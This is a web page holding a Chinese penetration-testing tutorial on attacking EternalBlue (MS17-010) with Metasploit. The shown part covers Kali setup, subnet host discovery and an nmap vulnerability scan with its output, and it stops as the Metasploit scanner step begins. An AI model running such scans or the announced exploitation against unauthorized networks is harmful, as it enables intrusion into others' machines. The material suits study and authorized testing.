@@ -1,0 +1,899 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】MSF框架实现“永恒之蓝”的闪电攻击 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="永恒之蓝,MSF,metasploit,渗透测试"/>
+    
+        <meta name="description" content="本篇文章主要介绍利用Metasploit中近期更新的针对ms17-101漏洞的攻击载荷进行攻击获取主机控制权限。我这里简单的记录下整个攻击利用所需要的工具准备、利用过程以及后渗透的一些简单内容。
+"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】MSF框架实现“永恒之蓝”的闪电攻击</h2>
+                <div class="article-msg">
+                    <span class="time">2017-06-12 09:58:40</span>
+                    
+                                        <span class="read">阅读：30310次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3964"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3964" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href=""
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=749283137" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t0153233266a45c8d6b.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=749283137" style="color:#848e99;">myles007</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p3.qhimg.com/t01b566d2def9b2f29b.png" title="t018f4ba720ad6c2aec.png" alt="http://p7.qhimg.com/t018f4ba720ad6c2aec.png"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=749283137" target="_blank" textvalue="myles007"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">myles007</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估</span><span style="font-weight: 900; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">稿费：300RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一、攻击简介</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在NSA工具箱刚刚放出来的时候，大家都在学习怎么玩转这个工具箱中的“永恒之蓝”的攻击，相信每个小伙伴学习的使用的时，都很不适应并很是花费了一番周折才搞定它吧，而且每次使用还要准备好相应的条件，今天就跟大家分享下我们刚刚学习到利用MSF框架快速搞定“MS017-010”漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实我们这里所说的使用MSF 实现 “永恒之蓝”的快速攻击，就是<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);"><strong>利用Metasploit中近期更新的针对ms17-101漏洞的攻击载荷进行攻击获取主机控制权限。我这里简单的记录下整个攻击利用所需要的工具准备、利用过程以及后渗透的一些简单内容。</strong></span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">二、工具准备</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">那接下来让我们准备下相关的工具吧，相信大家肯定会说，不还是要准备环境吗，其实这个环境都是大家进程用到的基本工具环境，只是做下简单准备就OK了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.1 nmap 环境准备</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（1）请将Nmap安装到当前最新版本(7.40以上)；&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（2）确保 script脚本中包含smb-vuln-ms17-010.nse脚本；&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在后面扫描检测是需要用到此脚本进行漏洞扫描检查，有关script脚本的存放位置在Nmap安装根目录下的有个“script”目录，直接进入搜索“ms17-010”，存在则无需再下载。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（3）相关软件下载&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">nmap下载地址：<a href="https://nmap.org/download.html" _src="https://nmap.org/download.html">https://nmap.org/download.html</a>&nbsp; &nbsp;&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">smb-vuln-ms17-010.nse下载地址：<a href="https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html" _src="https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html">https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.2 MSF 环境准备</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">metasploit 其默认在kali中就自带有整个攻击框架，后续我们对我们简称其为MSF框架。因为我们要用到针对“永恒之蓝”漏洞的攻击，故需要将MSF框架升级到最新版本，至少在4.14.17版本以上。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.2.1 kali环境要求</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">建议大家直接使用kali2.0的环境，这样后续进行MSF框架的升级也比较方便，不容易出现各种未知的问题，方面我们后续渗透攻击的展开。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（1） 编辑 kali 更新源&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先我配置kali的更新源：直接编辑更新源的配置文件“/etc/apt/sources.list” ,然后将下面的源复制进去保存即可。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">国内kali镜像更新源：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.#阿里云Kali源
+2.deb&nbsp;http://mirrors.aliyun.com/kali&nbsp;kali&nbsp;main&nbsp;non-free&nbsp;contrib&nbsp;
+3.deb-src&nbsp;http://mirrors.aliyun.com/kali&nbsp;kali&nbsp;main&nbsp;non-free&nbsp;contrib&nbsp;
+4.deb&nbsp;http://mirrors.aliyun.com/kali-security&nbsp;kali/updates&nbsp;main&nbsp;contrib&nbsp;non-free</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">配置完源配置文件后，直接进行更新安装，具体命令如下。</span></p><pre class="brush:plain;toolbar:false">root@kali:~#&nbsp;apt-get&nbsp;update&nbsp;&amp;&amp;&nbsp;apt-get&nbsp;upgrade&nbsp;&amp;&amp;&nbsp;apt-get&nbsp;dist-upgrade</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">（2）更新 kali系统&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">kali 源更新完后，我们进kali 内核的更新，具体更方法如下。</span></p><pre class="brush:plain;toolbar:false">root@kali:apt-get&nbsp;install&nbsp;linux-headers-$(uname&nbsp;-r)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注：如果报错了的话可以输入这个试试</span></p><pre class="brush:plain;toolbar:false">aptitude&nbsp;-r&nbsp;install&nbsp;linux-headers-$(uname&nbsp;-r</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2.2.2 MSF攻击框架版本要求</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">MSF框架版本要求在 4.11.17版本以上，具体版本查看方法如下。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">1.#&nbsp;msfconsole&nbsp;&nbsp;#进入框架
+2.msfconsole&gt;&nbsp;version</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">三、主机发现</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于主机的发现，我们可以使用的方法很多，这里简单记录和说明几种，供大家共同学习，每个人可根据主机的喜欢选择使用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.1 fping</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在kali 系统同自带有fping这个扫描工具，有关于主机发现的扫描命令如下。</span></p><pre class="brush:plain;toolbar:false">fping&nbsp;-asg&nbsp;192.168.1.0/24</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3.2 nbtscan</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在 kali 中自带有nbtscan这个同网段主机发现工具，有关扫描命令记录下发。</span></p><pre class="brush:plain;toolbar:false">nbtscan&nbsp;-r&nbsp;192.168.1.0/24</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3.3 nmap</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">关于namp 主机发现与扫描功能的强大，我们这里简单了记录几种个人常用的扫描方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（1） ping 包扫描</span></p><pre class="brush:plain;toolbar:false">nmap&nbsp;-n&nbsp;-sS&nbsp;192.168.1.0/24</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">（2） 指定端口发现扫描</span></p><pre class="brush:plain;toolbar:false">nmap&nbsp;-n&nbsp;-p445&nbsp;192.168.1.0/24&nbsp;--open</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">（3） 针对漏洞脚本的定向扫描</span></p><pre class="brush:plain;toolbar:false">nmap&nbsp;-n&nbsp;-p445&nbsp;--script&nbsp;smb-vuln-ms17-010&nbsp;192.168.1.0/24&nbsp;--open</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">以上扫描中，针对本次演示攻击中的主机发现扫描，个人推荐使用 nmap -n -p445 192.168.1.0/24 --open 其扫描发现的效率最高。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">四、漏洞扫描</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在确定目标范围中那些主机是存活后，我们可以进行定向445端口的漏洞脚本扫描了，直接找到存在漏洞的目标主机，为后续的MSF攻击提供目标。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实说到这里，大家会发现上面第三章节“主机发现”这一步，我们可以直接跳过，直接进定向445共享端口的漏洞扫描，上面之所以写出了，也是为了自己以后的学习和使用做一个笔记和记录。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.1 Nmap 漏洞扫描</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">MS17-101漏洞定向扫描命令如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">nmap&nbsp;-n&nbsp;-p445&nbsp;--script&nbsp;smb-vuln-ms17-010&nbsp;192.168.1.0/24&nbsp;--open
+1.Starting&nbsp;Nmap&nbsp;7.40&nbsp;(&nbsp;https://nmap.org&nbsp;)&nbsp;at&nbsp;2017-06-06&nbsp;09:38&nbsp;?D1迆㊣那℅?那㊣??
+2.Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;192.168.1.1
+3.Host&nbsp;is&nbsp;up&nbsp;(0.00088s&nbsp;latency).
+4.PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE
+5.445/tcp&nbsp;closed&nbsp;microsoft-ds
+6.MAC&nbsp;Address:&nbsp;94:0C:6D:11:9F:CE&nbsp;(Tp-link&nbsp;Technologies)
+7.
+8.Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;192.168.1.103
+9.Host&nbsp;is&nbsp;up&nbsp;(0.072s&nbsp;latency).
+10.PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;&nbsp;SERVICE
+11.445/tcp&nbsp;filtered&nbsp;microsoft-ds
+12.MAC&nbsp;Address:&nbsp;38:A4:ED:68:9E:25&nbsp;(Xiaomi&nbsp;Communications)
+13.
+14.Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;192.168.1.109
+15.Host&nbsp;is&nbsp;up&nbsp;(0.0059s&nbsp;latency).
+16.PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE
+17.445/tcp&nbsp;closed&nbsp;microsoft-ds
+18.MAC&nbsp;Address:&nbsp;60:02:B4:7B:4D:93&nbsp;(Wistron&nbsp;Neweb)
+19.
+20.Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;192.168.1.112
+21.Host&nbsp;is&nbsp;up&nbsp;(0.0040s&nbsp;latency).
+22.PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE
+23.445/tcp&nbsp;open&nbsp;&nbsp;microsoft-ds
+24.MAC&nbsp;Address:&nbsp;48:D2:24:FF:6A:CD&nbsp;(Liteon&nbsp;Technology)
+25.
+26.Host&nbsp;script&nbsp;results:
+27.|&nbsp;smb-vuln-ms17-010:&nbsp;
+28.|&nbsp;&nbsp;&nbsp;VULNERABLE:
+29.|&nbsp;&nbsp;&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;vulnerability&nbsp;in&nbsp;Microsoft&nbsp;SMBv1&nbsp;servers&nbsp;(ms17-010)
+30.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State:&nbsp;VULNERABLE
+31.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IDs:&nbsp;&nbsp;CVE:CVE-2017-0143
+32.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Risk&nbsp;factor:&nbsp;HIGH
+33.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;critical&nbsp;remote&nbsp;code&nbsp;execution&nbsp;vulnerability&nbsp;exists&nbsp;in&nbsp;Microsoft&nbsp;SMBv1
+34.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;servers&nbsp;(ms17-010).
+35.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+36.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disclosure&nbsp;date:&nbsp;2017-03-14
+37.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;References:
+38.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+39.|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+40.|_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过Nmap 的445端口定向漏洞扫描发现 192.168.1.112 存在MS17-010漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.2 MSF Auxiliary 辅助扫描</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实如果不直接使用namp进行漏洞定向扫描，我们也可以直接使用MSF框架的辅助模块“”auxiliary”中的扫描模块进行扫描。了解MSF的同学肯定都知道，MSF的扫描模块基本也就是调用nmap扫描来实现的。这里就简单记录下这个“auxiliary/scanner/”扫描模块的下漏洞扫描方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">msfconsole&nbsp;#&nbsp;进入MSF框架&nbsp;
+version&nbsp;#&nbsp;确认下MSF的版本&nbsp;
